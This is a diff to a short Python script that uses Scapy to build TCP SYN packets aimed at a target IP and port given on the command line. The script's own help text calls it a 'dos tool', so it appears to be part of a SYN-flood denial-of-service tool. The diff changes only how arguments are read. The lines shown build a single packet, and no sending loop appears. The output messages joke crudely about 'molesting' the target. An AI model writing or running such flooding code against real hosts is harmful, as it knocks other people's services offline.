@@ -1,18 +1,18 @@
 from scapy.all import IP, TCP, send
 import sys
-import argparse
+
 
 
 # cli args
-parser = argparse.ArgumentParser(description="fowler flooder, best dos tool")
-parser.add_argument("ip", help="what ip u tryna molest")
-parser.add_argument("port", type=int, help="what port u molesting today")
+if len(sys.argv) != 3:
+    print(f"Usage: python {sys.argv[0]} <target_ip> <target_port>")
 
-args = parser.parse_args()
 
+target_ip = sys.argv[1]
+target_port = int(sys.argv[2])
 
 # Build SYN packet
-packet = IP(dst=args.ip)/TCP(dport=args.port, flags="S")
+packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
 
 print(f"{target_ip}:{target_port} just got molested by D-D-D-D-D-DJ Fowlerrrrrr")
 
